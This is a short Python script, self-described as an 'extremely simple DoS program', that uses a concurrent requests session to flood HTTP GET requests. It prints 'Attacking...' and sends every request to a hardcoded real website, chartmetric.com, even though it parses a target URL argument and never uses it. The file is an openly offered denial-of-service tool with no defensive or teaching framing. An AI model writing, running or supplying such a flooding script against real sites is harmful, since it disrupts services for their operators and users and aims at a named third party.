import sys
import argparse
from requests_futures.sessions import FuturesSession

def pre_response_hook(n):
  def response_hook(resp, *args, **kwargs):
    print('Got response from %sth request' % n)
  return response_hook

def main():
  parser = argparse.ArgumentParser(description='Extremely simple DoS program')
  parser.add_argument('--workers', '-w', default=1, help='number of workers')
  parser.add_argument('--url', '-u', help='target URL')
  parser.add_argument('--number', '-n', default=1, help='number of requests')
  args = parser.parse_args()
  if args.url:
    num_of_workers = int(args.workers)
    num_of_requests = int(args.number)
    url = args.url
    print('Number of workers %d' % num_of_workers)
    print('Number of requests %d' % num_of_requests)
    print('Target URL: %s' % url)
    session = FuturesSession(max_workers=num_of_workers)
    print('Attacking...')
    responses = (session.get('https://chartmetric.com', hooks={
        'response': pre_response_hook(i+1)
    }) for i in range(num_of_requests))
    for response in responses:
      response.result()
      
if __name__ == '__main__':
  main()


